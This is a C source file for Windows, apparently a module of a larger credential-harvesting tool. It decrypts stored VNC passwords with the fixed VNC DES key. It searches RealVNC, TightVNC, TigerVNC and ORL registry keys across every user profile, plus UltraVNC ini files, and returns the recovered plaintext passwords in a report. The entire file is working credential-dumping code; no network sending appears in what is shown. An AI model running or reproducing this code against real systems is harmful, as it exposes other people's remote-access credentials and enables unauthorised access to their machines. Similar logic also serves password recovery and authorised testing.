/*
 * VNC password decryption and discovery.
 *
 * This module keeps the broader scan coverage of the current project, but
 * aligns the actual VNC password decoder with the classic vncpwd / d3des
 * logic used by VNC itself.
 */
#include "vnc.h"
#include "browser/utils.h"
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winreg.h>

#define VNC_MAX_DATA   256
#define VNC_MAX_TEXT   512
#define VNC_HEADER     "===== VNC Password Decryption =====\n"

/* ------------------------------------------------------------------ */
/* VNC-compatible DES (adapted from the public d3des implementation)  */
/* ------------------------------------------------------------------ */
#define VNC_DE1 1

static unsigned long vnc_KnL[32];

static unsigned short vnc_bytebit[8] = {
    01, 02, 04, 010, 020, 040, 0100, 0200
};

static unsigned long vnc_bigbyte[24] = {
    0x800000L, 0x400000L, 0x200000L, 0x100000L,
    0x080000L, 0x040000L, 0x020000L, 0x010000L,
    0x008000L, 0x004000L, 0x002000L, 0x001000L,
    0x000800L, 0x000400L, 0x000200L, 0x000100L,
    0x000080L, 0x000040L, 0x000020L, 0x000010L,
    0x000008L, 0x000004L, 0x000002L, 0x000001L
};

static unsigned char vnc_pc1[56] = {
    56, 48, 40, 32, 24, 16,  8,  0, 57, 49, 41, 33, 25, 17,
     9,  1, 58, 50, 42, 34, 26, 18, 10,  2, 59, 51, 43, 35,
    62, 54, 46, 38, 30, 22, 14,  6, 61, 53, 45, 37, 29, 21,
    13,  5, 60, 52, 44, 36, 28, 20, 12,  4, 27, 19, 11,  3
};

static unsigned char vnc_totrot[16] = {
    1, 2, 4, 6, 8, 10, 12, 14, 15, 17, 19, 21, 23, 25, 27, 28
};

static unsigned char vnc_pc2[48] = {
    13, 16, 10, 23,  0,  4,  2, 27, 14,  5, 20,  9,
    22, 18, 11,  3, 25,  7, 15,  6, 26, 19, 12,  1,
    40, 51, 30, 36, 46, 54, 29, 39, 50, 44, 32, 47,
    43, 48, 38, 55, 33, 52, 45, 41, 49, 35, 28, 31
};

static unsigned long vnc_SP1[64] = {
    0x01010400L,0x00000000L,0x00010000L,0x01010404L,
    0x01010004L,0x00010404L,0x00000004L,0x00010000L,
    0x00000400L,0x01010400L,0x01010404L,0x00000400L,
    0x01000404L,0x01010004L,0x01000000L,0x00000004L,
    0x00000404L,0x01000400L,0x01000400L,0x00010400L,
    0x00010400L,0x01010000L,0x01010000L,0x01000404L,
    0x00010004L,0x01000004L,0x01000004L,0x00010004L,
    0x00000000L,0x00000404L,0x00010404L,0x01000000L,
    0x00010000L,0x01010404L,0x00000004L,0x01010000L,
    0x01010400L,0x01000000L,0x01000000L,0x00000400L,
    0x01010004L,0x00010000L,0x00010400L,0x01000004L,
    0x00000400L,0x00000004L,0x01000404L,0x00010404L,
    0x01010404L,0x00010004L,0x01010000L,0x01000404L,
    0x01000004L,0x00000404L,0x00010404L,0x01010400L,
    0x00000404L,0x01000400L,0x01000400L,0x00000000L,
    0x00010004L,0x00010400L,0x00000000L,0x01010004L
};

static unsigned long vnc_SP2[64] = {
    0x80108020L,0x80008000L,0x00008000L,0x00108020L,
    0x00100000L,0x00000020L,0x80100020L,0x80008020L,
    0x80000020L,0x80108020L,0x80108000L,0x80000000L,
    0x80008000L,0x00100000L,0x00000020L,0x80100020L,
    0x00108000L,0x00100020L,0x80008020L,0x00000000L,
    0x80000000L,0x00008000L,0x00108020L,0x80100000L,
    0x00100020L,0x80000020L,0x00000000L,0x00108000L,
    0x00008020L,0x80108000L,0x80100000L,0x00008020L,
    0x00000000L,0x00108020L,0x80100020L,0x00100000L,
    0x80008020L,0x80100000L,0x80108000L,0x00008000L,
    0x80100000L,0x80008000L,0x00000020L,0x80108020L,
    0x00108020L,0x00000020L,0x00008000L,0x80000000L,
    0x00008020L,0x80108000L,0x00100000L,0x80000020L,
    0x00100020L,0x80008020L,0x80000020L,0x00100020L,
    0x00108000L,0x00000000L,0x80008000L,0x00008020L,
    0x80000000L,0x80100020L,0x80108020L,0x00108000L
};

static unsigned long vnc_SP3[64] = {
    0x00000208L,0x08020200L,0x00000000L,0x08020008L,
    0x08000200L,0x00000000L,0x00020208L,0x08000200L,
    0x00020008L,0x08000008L,0x08000008L,0x00020000L,
    0x08020208L,0x00020008L,0x08020000L,0x00000208L,
    0x08000000L,0x00000008L,0x08020200L,0x00000200L,
    0x00020200L,0x08020000L,0x08020008L,0x00020208L,
    0x08000208L,0x00020200L,0x00020000L,0x08000208L,
    0x00000008L,0x08020208L,0x00000200L,0x08000000L,
    0x08020200L,0x08000000L,0x00020008L,0x00000208L,
    0x00020000L,0x08020200L,0x08000200L,0x00000000L,
    0x00000200L,0x00020008L,0x08020208L,0x08000200L,
    0x08000008L,0x00000200L,0x00000000L,0x08020008L,
    0x08000208L,0x00020000L,0x08000000L,0x08020208L,
    0x00000008L,0x00020208L,0x00020200L,0x08000008L,
    0x08020000L,0x08000208L,0x00000208L,0x08020000L,
    0x00020208L,0x00000008L,0x08020008L,0x00020200L
};

static unsigned long vnc_SP4[64] = {
    0x00802001L,0x00002081L,0x00002081L,0x00000080L,
    0x00802080L,0x00800081L,0x00800001L,0x00002001L,
    0x00000000L,0x00802000L,0x00802000L,0x00802081L,
    0x00000081L,0x00000000L,0x00800080L,0x00800001L,
    0x00000001L,0x00002000L,0x00800000L,0x00802001L,
    0x00000080L,0x00800000L,0x00002001L,0x00002080L,
    0x00800081L,0x00000001L,0x00002080L,0x00800080L,
    0x00002000L,0x00802080L,0x00802081L,0x00000081L,
    0x00800080L,0x00800001L,0x00802000L,0x00802081L,
    0x00000081L,0x00000000L,0x00000000L,0x00802000L,
    0x00002080L,0x00800080L,0x00800081L,0x00000001L,
    0x00802001L,0x00002081L,0x00002081L,0x00000080L,
    0x00802081L,0x00000081L,0x00000001L,0x00002000L,
    0x00800001L,0x00002001L,0x00802080L,0x00800081L,
    0x00002001L,0x00002080L,0x00800000L,0x00802001L,
    0x00000080L,0x00800000L,0x00002000L,0x00802080L
};

static unsigned long vnc_SP5[64] = {
    0x00000100L,0x02080100L,0x02080000L,0x42000100L,
    0x00080000L,0x00000100L,0x40000000L,0x02080000L,
    0x40080100L,0x00080000L,0x02000100L,0x40080100L,
    0x42000100L,0x42080000L,0x00080100L,0x40000000L,
    0x02000000L,0x40080000L,0x40080000L,0x00000000L,
    0x40000100L,0x42080100L,0x42080100L,0x02000100L,
    0x42080000L,0x40000100L,0x00000000L,0x42000000L,
    0x02080100L,0x02000000L,0x42000000L,0x00080100L,
    0x00080000L,0x42000100L,0x00000100L,0x02000000L,
    0x40000000L,0x02080000L,0x42000100L,0x40080100L,
    0x02000100L,0x40000000L,0x42080000L,0x02080100L,
    0x40080100L,0x00000100L,0x02000000L,0x42080000L,
    0x42080100L,0x00080100L,0x42000000L,0x42080100L,
    0x02080000L,0x00000000L,0x40080000L,0x42000000L,
    0x00080100L,0x02000100L,0x40000100L,0x00080000L,
    0x00000000L,0x40080000L,0x02080100L,0x40000100L
};

static unsigned long vnc_SP6[64] = {
    0x20000010L,0x20400000L,0x00004000L,0x20404010L,
    0x20400000L,0x00000010L,0x20404010L,0x00400000L,
    0x20004000L,0x00404010L,0x00400000L,0x20000010L,
    0x00400010L,0x20004000L,0x20000000L,0x00004010L,
    0x00000000L,0x00400010L,0x20004010L,0x00004000L,
    0x00404000L,0x20004010L,0x00000010L,0x20400010L,
    0x20400010L,0x00000000L,0x00404010L,0x20404000L,
    0x00004010L,0x00404000L,0x20404000L,0x20000000L,
    0x20004000L,0x00000010L,0x20400010L,0x00404000L,
    0x20404010L,0x00400000L,0x00004010L,0x20000010L,
    0x00400000L,0x20004000L,0x20000000L,0x00004010L,
    0x20000010L,0x20404010L,0x00404000L,0x20400000L,
    0x00404010L,0x20404000L,0x00000000L,0x20400010L,
    0x00000010L,0x00004000L,0x20400000L,0x00404010L,
    0x00004000L,0x00400010L,0x20004010L,0x00000000L,
    0x20404000L,0x20000000L,0x00400010L,0x20004010L
};

static unsigned long vnc_SP7[64] = {
    0x00200000L,0x04200002L,0x04000802L,0x00000000L,
    0x00000800L,0x04000802L,0x00200802L,0x04200800L,
    0x04200802L,0x00200000L,0x00000000L,0x04000002L,
    0x00000002L,0x04000000L,0x04200002L,0x00000802L,
    0x04000800L,0x00200802L,0x00200002L,0x04000800L,
    0x04000002L,0x04200000L,0x04200800L,0x00200002L,
    0x04200000L,0x00000800L,0x00000802L,0x04200802L,
    0x00200800L,0x00000002L,0x04000000L,0x00200800L,
    0x04000000L,0x00200800L,0x00200000L,0x04000802L,
    0x04000802L,0x04200002L,0x04200002L,0x00000002L,
    0x00200002L,0x04000000L,0x04000800L,0x00200000L,
    0x04200800L,0x00000802L,0x00200802L,0x04200800L,
    0x00000802L,0x04000002L,0x04200802L,0x04200000L,
    0x00200800L,0x00000000L,0x00000002L,0x04200802L,
    0x00000000L,0x00200802L,0x04200000L,0x00000800L,
    0x04000002L,0x04000800L,0x00000800L,0x00200002L
};

static unsigned long vnc_SP8[64] = {
    0x10001040L,0x00001000L,0x00040000L,0x10041040L,
    0x10000000L,0x10001040L,0x00000040L,0x10000000L,
    0x00040040L,0x10040000L,0x10041040L,0x00041000L,
    0x10041000L,0x00041040L,0x00001000L,0x00000040L,
    0x10040000L,0x10000040L,0x10001000L,0x00001040L,
    0x00041000L,0x00040040L,0x10040040L,0x10041000L,
    0x00001040L,0x00000000L,0x00000000L,0x10040040L,
    0x10000040L,0x10001000L,0x00041040L,0x00040000L,
    0x00041040L,0x00040000L,0x10041000L,0x00001000L,
    0x00000040L,0x10040040L,0x00001000L,0x00041040L,
    0x10001000L,0x00000040L,0x10000040L,0x10040000L,
    0x10040040L,0x10000000L,0x00040000L,0x10001040L,
    0x00000000L,0x10041040L,0x00040040L,0x10000040L,
    0x10040000L,0x10001000L,0x10001040L,0x00000000L,
    0x10041040L,0x00041000L,0x00041000L,0x00001040L,
    0x00001040L,0x00040040L,0x10000000L,0x10041000L
};

static void vnc_scrunch(unsigned char *outof, unsigned long *into) {
    *into    = (*outof++ & 0xffUL) << 24;
    *into   |= (*outof++ & 0xffUL) << 16;
    *into   |= (*outof++ & 0xffUL) << 8;
    *into++ |= (*outof++ & 0xffUL);
    *into    = (*outof++ & 0xffUL) << 24;
    *into   |= (*outof++ & 0xffUL) << 16;
    *into   |= (*outof++ & 0xffUL) << 8;
    *into   |= (*outof   & 0xffUL);
}

static void vnc_unscrun(unsigned long *outof, unsigned char *into) {
    *into++ = (unsigned char)((*outof >> 24) & 0xffUL);
    *into++ = (unsigned char)((*outof >> 16) & 0xffUL);
    *into++ = (unsigned char)((*outof >> 8) & 0xffUL);
    *into++ = (unsigned char)(*outof++ & 0xffUL);
    *into++ = (unsigned char)((*outof >> 24) & 0xffUL);
    *into++ = (unsigned char)((*outof >> 16) & 0xffUL);
    *into++ = (unsigned char)((*outof >> 8) & 0xffUL);
    *into   = (unsigned char)(*outof & 0xffUL);
}

static void vnc_usekey(unsigned long *from) {
    unsigned long *to = vnc_KnL;
    unsigned long *endp = &vnc_KnL[32];
    while (to < endp) *to++ = *from++;
}

static void vnc_cookey(unsigned long *raw1) {
    unsigned long dough[32];
    unsigned long *cook = dough;

    for (int i = 0; i < 16; i++, raw1++) {
        unsigned long *raw0 = raw1++;
        *cook    = (*raw0 & 0x00fc0000L) << 6;
        *cook   |= (*raw0 & 0x00000fc0L) << 10;
        *cook   |= (*raw1 & 0x00fc0000L) >> 10;
        *cook++ |= (*raw1 & 0x00000fc0L) >> 6;
        *cook    = (*raw0 & 0x0003f000L) << 12;
        *cook   |= (*raw0 & 0x0000003fL) << 16;
        *cook   |= (*raw1 & 0x0003f000L) >> 4;
        *cook++ |= (*raw1 & 0x0000003fL);
    }

    vnc_usekey(dough);
}

static void vnc_deskey(unsigned char *key, short edf) {
    int i, j, l, m, n;
    unsigned char pc1m[56], pcr[56];
    unsigned long kn[32];

    for (j = 0; j < 56; j++) {
        l = vnc_pc1[j];
        m = l & 07;
        pc1m[j] = (key[l >> 3] & vnc_bytebit[m]) ? 1 : 0;
    }

    for (i = 0; i < 16; i++) {
        m = (edf == VNC_DE1 ? (15 - i) : i) << 1;
        n = m + 1;
        kn[m] = kn[n] = 0L;

        for (j = 0; j < 28; j++) {
            l = j + vnc_totrot[i];
            pcr[j] = (l < 28) ? pc1m[l] : pc1m[l - 28];
        }
        for (j = 28; j < 56; j++) {
            l = j + vnc_totrot[i];
            pcr[j] = (l < 56) ? pc1m[l] : pc1m[l - 28];
        }
        for (j = 0; j < 24; j++) {
            if (pcr[vnc_pc2[j]]) kn[m] |= vnc_bigbyte[j];
            if (pcr[vnc_pc2[j + 24]]) kn[n] |= vnc_bigbyte[j];
        }
    }

    vnc_cookey(kn);
}

static void vnc_desfunc(unsigned long *block, unsigned long *keys) {
    unsigned long fval, work, right, leftt;

    leftt = block[0];
    right = block[1];

    work = ((leftt >> 4) ^ right) & 0x0f0f0f0fL;
    right ^= work;
    leftt ^= (work << 4);
    work = ((leftt >> 16) ^ right) & 0x0000ffffL;
    right ^= work;
    leftt ^= (work << 16);
    work = ((right >> 2) ^ leftt) & 0x33333333L;
    leftt ^= work;
    right ^= (work << 2);
    work = ((right >> 8) ^ leftt) & 0x00ff00ffL;
    leftt ^= work;
    right ^= (work << 8);
    right = ((right << 1) | ((right >> 31) & 1UL)) & 0xffffffffUL;
    work = (leftt ^ right) & 0xaaaaaaaaUL;
    leftt ^= work;
    right ^= work;
    leftt = ((leftt << 1) | ((leftt >> 31) & 1UL)) & 0xffffffffUL;

    for (int round = 0; round < 8; round++) {
        work  = (right << 28) | (right >> 4);
        work ^= *keys++;
        fval  = vnc_SP7[ work        & 0x3fUL];
        fval |= vnc_SP5[(work >>  8) & 0x3fUL];
        fval |= vnc_SP3[(work >> 16) & 0x3fUL];
        fval |= vnc_SP1[(work >> 24) & 0x3fUL];
        work  = right ^ *keys++;
        fval |= vnc_SP8[ work        & 0x3fUL];
        fval |= vnc_SP6[(work >>  8) & 0x3fUL];
        fval |= vnc_SP4[(work >> 16) & 0x3fUL];
        fval |= vnc_SP2[(work >> 24) & 0x3fUL];
        leftt ^= fval;

        work  = (leftt << 28) | (leftt >> 4);
        work ^= *keys++;
        fval  = vnc_SP7[ work        & 0x3fUL];
        fval |= vnc_SP5[(work >>  8) & 0x3fUL];
        fval |= vnc_SP3[(work >> 16) & 0x3fUL];
        fval |= vnc_SP1[(work >> 24) & 0x3fUL];
        work  = leftt ^ *keys++;
        fval |= vnc_SP8[ work        & 0x3fUL];
        fval |= vnc_SP6[(work >>  8) & 0x3fUL];
        fval |= vnc_SP4[(work >> 16) & 0x3fUL];
        fval |= vnc_SP2[(work >> 24) & 0x3fUL];
        right ^= fval;
    }

    right = (right << 31) | (right >> 1);
    work = (leftt ^ right) & 0xaaaaaaaaUL;
    leftt ^= work;
    right ^= work;
    leftt = (leftt << 31) | (leftt >> 1);
    work = ((leftt >> 8) ^ right) & 0x00ff00ffUL;
    right ^= work;
    leftt ^= (work << 8);
    work = ((leftt >> 2) ^ right) & 0x33333333UL;
    right ^= work;
    leftt ^= (work << 2);
    work = ((right >> 16) ^ leftt) & 0x0000ffffUL;
    leftt ^= work;
    right ^= (work << 16);
    work = ((right >> 4) ^ leftt) & 0x0f0f0f0fUL;
    leftt ^= work;
    right ^= (work << 4);
    block[0] = right;
    block[1] = leftt;
}

static void vnc_des(unsigned char *inblock, unsigned char *outblock) {
    unsigned long work[2];
    vnc_scrunch(inblock, work);
    vnc_desfunc(work, vnc_KnL);
    vnc_unscrun(work, outblock);
}

/* ------------------------------------------------------------------ */
/* Generic helpers                                                    */
/* ------------------------------------------------------------------ */
static int ascii_ieq(const char *a, const char *b) {
    while (*a && *b) {
        if (tolower((unsigned char)*a) != tolower((unsigned char)*b)) return 0;
        a++;
        b++;
    }
    return *a == '\0' && *b == '\0';
}

static int ascii_contains_nocase(const char *haystack, const char *needle) {
    size_t needle_len = strlen(needle);
    if (needle_len == 0) return 1;
    for (const char *p = haystack; *p; p++) {
        size_t i = 0;
        while (i < needle_len &&
               p[i] &&
               tolower((unsigned char)p[i]) == tolower((unsigned char)needle[i])) {
            i++;
        }
        if (i == needle_len) return 1;
    }
    return 0;
}

static int is_hex_text(const char *s, int len) {
    if (len <= 0 || (len % 2) != 0) return 0;
    for (int i = 0; i < len; i++) {
        if (!isxdigit((unsigned char)s[i])) return 0;
    }
    return 1;
}

static int hex_decode(const char *hex, int len, unsigned char *out, int out_cap) {
    int out_len = len / 2;
    if (out_len > out_cap) return -1;
    for (int i = 0; i < out_len; i++) {
        unsigned int v = 0;
        if (sscanf(hex + (i * 2), "%02x", &v) != 1) return -1;
        out[i] = (unsigned char)v;
    }
    return out_len;
}

static int extract_string_bytes(const unsigned char *raw, DWORD size, unsigned char *out, int out_cap) {
    int len = 0;
    while ((DWORD)len < size && raw[len] != '\0') len++;
    while (len > 0 && isspace((unsigned char)raw[len - 1])) len--;
    while (len > 0 && isspace((unsigned char)*raw)) {
        raw++;
        len--;
    }
    if (len <= 0 || len > out_cap) return -1;
    if (is_hex_text((const char *)raw, len)) {
        return hex_decode((const char *)raw, len, out, out_cap);
    }
    memcpy(out, raw, len);
    return len;
}

static int normalize_value_data(DWORD type, const unsigned char *raw, DWORD size,
                                unsigned char *out, int out_cap) {
    if (size == 0 || size > (DWORD)out_cap) return -1;
    if (type == REG_BINARY) {
        memcpy(out, raw, size);
        return (int)size;
    }
    if (type == REG_SZ || type == REG_EXPAND_SZ) {
        return extract_string_bytes(raw, size, out, out_cap);
    }
    return -1;
}

static void vnc_decrypt_bytes(const unsigned char *enc, int enc_len,
                              unsigned char *dec, int *dec_len) {
    static unsigned char fixedkey[8] = {23, 82, 107, 6, 35, 78, 88, 7};
    int blocks = (enc_len + 7) / 8;

    vnc_deskey(fixedkey, VNC_DE1);
    for (int i = 0; i < blocks; i++) {
        unsigned char inblk[8] = {0};
        memcpy(inblk, enc + (i * 8), (size_t)((enc_len - i * 8) >= 8 ? 8 : (enc_len - i * 8)));
        vnc_des(inblk, dec + (i * 8));
    }
    *dec_len = blocks * 8;
}

static int decrypted_text_len(const unsigned char *buf, int len) {
    int end = 0;
    while (end < len && buf[end] != '\0') end++;
    while (end > 0 && isspace((unsigned char)buf[end - 1])) end--;
    return end;
}

static int looks_valid_password(const unsigned char *buf, int len) {
    if (len <= 0 || len > 64) return 0;
    for (int i = 0; i < len; i++) {
        if (buf[i] < 0x20 || buf[i] > 0x7e) return 0;
    }
    return 1;
}

static void append_result(char *result, int *rp, int maxr,
                          const char *source, const char *location,
                          const char *value_name, const unsigned char *plain, int plain_len) {
    if (*rp >= maxr) return;
    *rp += snprintf(result + *rp, maxr - *rp,
        "[%s] %s | %s | Password: %.*s\n",
        source, location, value_name, plain_len, plain);
}

static void try_decrypt_value(char *result, int *rp, int maxr,
                              const char *source, const char *location,
                              const char *value_name, DWORD type,
                              const unsigned char *raw, DWORD raw_size) {
    unsigned char enc[VNC_MAX_DATA];
    unsigned char dec[VNC_MAX_DATA + 8];
    int enc_len;
    int dec_len;
    int text_len;

    enc_len = normalize_value_data(type, raw, raw_size, enc, sizeof(enc));
    if (enc_len < 8 || enc_len > VNC_MAX_DATA) return;

    memset(dec, 0, sizeof(dec));
    vnc_decrypt_bytes(enc, enc_len, dec, &dec_len);
    text_len = decrypted_text_len(dec, dec_len);
    if (!looks_valid_password(dec, text_len)) return;

    append_result(result, rp, maxr, source, location, value_name, dec, text_len);
}

/* ------------------------------------------------------------------ */
/* Registry scanning                                                  */
/* ------------------------------------------------------------------ */
typedef struct {
    HKEY root;
    const char *path;
    const char *label;
} VNCBaseKey;

static void scan_registry_tree(char *result, int *rp, int maxr,
                               HKEY root, const char *path, const char *label);

static void scan_values_in_key(char *result, int *rp, int maxr,
                               HKEY hk, const char *path, const char *label) {
    DWORD idx = 0;
    char value_name[256];
    unsigned char raw[VNC_MAX_DATA];

    for (;;) {
        DWORD value_len = sizeof(value_name);
        DWORD data_len = sizeof(raw);
        DWORD type = 0;
        LONG ret = RegEnumValueA(hk, idx++, value_name, &value_len, NULL, &type, raw, &data_len);
        if (ret != ERROR_SUCCESS) break;

        value_name[sizeof(value_name) - 1] = '\0';
        if (!ascii_contains_nocase(value_name, "pass")) continue;
        try_decrypt_value(result, rp, maxr, label, path, value_name, type, raw, data_len);
    }
}

static void scan_registry_tree(char *result, int *rp, int maxr,
                               HKEY root, const char *path, const char *label) {
    HKEY hk;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &hk) != ERROR_SUCCESS) return;

    scan_values_in_key(result, rp, maxr, hk, path, label);

    DWORD idx = 0;
    char subkey[256];
    for (;;) {
        DWORD subkey_len = sizeof(subkey);
        LONG ret = RegEnumKeyExA(hk, idx++, subkey, &subkey_len, NULL, NULL, NULL, NULL);
        if (ret != ERROR_SUCCESS) break;

        char next_path[512];
        if (snprintf(next_path, sizeof(next_path), "%s\\%s", path, subkey) < (int)sizeof(next_path)) {
            scan_registry_tree(result, rp, maxr, root, next_path, label);
        }
    }

    RegCloseKey(hk);
}

static void scan_hku_suffix(char *result, int *rp, int maxr,
                            const char *suffix, const char *label) {
    HKEY hk_users;
    if (RegOpenKeyExA(HKEY_USERS, "", 0, KEY_READ, &hk_users) != ERROR_SUCCESS) return;

    DWORD idx = 0;
    char sid[256];
    for (;;) {
        DWORD sid_len = sizeof(sid);
        LONG ret = RegEnumKeyExA(hk_users, idx++, sid, &sid_len, NULL, NULL, NULL, NULL);
        if (ret != ERROR_SUCCESS) break;
        if (sid[0] == '.') continue;

        char full_path[512];
        if (snprintf(full_path, sizeof(full_path), "%s\\%s", sid, suffix) < (int)sizeof(full_path)) {
            scan_registry_tree(result, rp, maxr, HKEY_USERS, full_path, label);
        }
    }

    RegCloseKey(hk_users);
}

static void scan_registry(char *result, int *rp, int maxr) {
    static const VNCBaseKey bases[] = {
        {HKEY_LOCAL_MACHINE, "SOFTWARE\\RealVNC",  "RealVNC"},
        {HKEY_CURRENT_USER,  "Software\\RealVNC",  "RealVNC"},
        {HKEY_LOCAL_MACHINE, "SOFTWARE\\TightVNC", "TightVNC"},
        {HKEY_CURRENT_USER,  "Software\\TightVNC", "TightVNC"},
        {HKEY_LOCAL_MACHINE, "SOFTWARE\\TigerVNC", "TigerVNC"},
        {HKEY_CURRENT_USER,  "Software\\TigerVNC", "TigerVNC"},
        {HKEY_LOCAL_MACHINE, "SOFTWARE\\ORL",      "ORL VNC"},
        {HKEY_CURRENT_USER,  "Software\\ORL",      "ORL VNC"},
    };

    for (size_t i = 0; i < sizeof(bases) / sizeof(bases[0]); i++) {
        scan_registry_tree(result, rp, maxr, bases[i].root, bases[i].path, bases[i].label);
    }

    scan_hku_suffix(result, rp, maxr, "Software\\ORL", "ORL VNC");
    scan_hku_suffix(result, rp, maxr, "Software\\RealVNC", "RealVNC");
    scan_hku_suffix(result, rp, maxr, "Software\\TightVNC", "TightVNC");
    scan_hku_suffix(result, rp, maxr, "Software\\TigerVNC", "TigerVNC");
}

/* ------------------------------------------------------------------ */
/* UltraVNC ini scanning                                              */
/* ------------------------------------------------------------------ */
static void trim_ascii(char *s) {
    char *start = s;
    char *end;
    while (*start && isspace((unsigned char)*start)) start++;
    if (start != s) memmove(s, start, strlen(start) + 1);
    end = s + strlen(s);
    while (end > s && isspace((unsigned char)end[-1])) end--;
    *end = '\0';
}

static void scan_ultravnc_ini_file(char *result, int *rp, int maxr, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return;

    char line[512];
    while (fgets(line, sizeof(line), f)) {
        char *eq;
        char key[128];
        char val[256];
        unsigned char raw[VNC_MAX_DATA];
        unsigned char dec[VNC_MAX_DATA + 8];
        int enc_len;
        int dec_len;
        int text_len;

        line[strcspn(line, "\r\n")] = '\0';
        eq = strchr(line, '=');
        if (!eq) continue;

        *eq = '\0';
        snprintf(key, sizeof(key), "%s", line);
        snprintf(val, sizeof(val), "%s", eq + 1);
        trim_ascii(key);
        trim_ascii(val);

        if (!(ascii_ieq(key, "passwd") || ascii_ieq(key, "passwd2"))) continue;

        if (is_hex_text(val, (int)strlen(val))) {
            enc_len = hex_decode(val, (int)strlen(val), raw, sizeof(raw));
        } else {
            enc_len = (int)strlen(val);
            if (enc_len > (int)sizeof(raw)) enc_len = -1;
            if (enc_len > 0) memcpy(raw, val, enc_len);
        }
        if (enc_len < 8) continue;

        memset(dec, 0, sizeof(dec));
        vnc_decrypt_bytes(raw, enc_len, dec, &dec_len);
        text_len = decrypted_text_len(dec, dec_len);
        if (!looks_valid_password(dec, text_len)) continue;

        append_result(result, rp, maxr, "UltraVNC", path, key, dec, text_len);
    }

    fclose(f);
}

static void scan_ultravnc_ini(char *result, int *rp, int maxr) {
    static const char *paths[] = {
        "C:\\Program Files\\UltraVNC\\ultravnc.ini",
        "C:\\Program Files (x86)\\UltraVNC\\ultravnc.ini",
        "C:\\ProgramData\\UltraVNC\\ultravnc.ini",
        NULL
    };

    for (int i = 0; paths[i]; i++) {
        if (path_exists(paths[i])) scan_ultravnc_ini_file(result, rp, maxr, paths[i]);
    }
}

const char *vnc_scan(void) {
    static char result[65536];
    int rp = 0;
    result[0] = '\0';

    rp += snprintf(result + rp, sizeof(result) - rp, VNC_HEADER);
    scan_registry(result, &rp, (int)sizeof(result));
    scan_ultravnc_ini(result, &rp, (int)sizeof(result));

    if (rp == (int)strlen(VNC_HEADER)) {
        rp += snprintf(result + rp, sizeof(result) - rp,
            "  No VNC passwords found in registry or config files.\n");
    }

    return result;
}
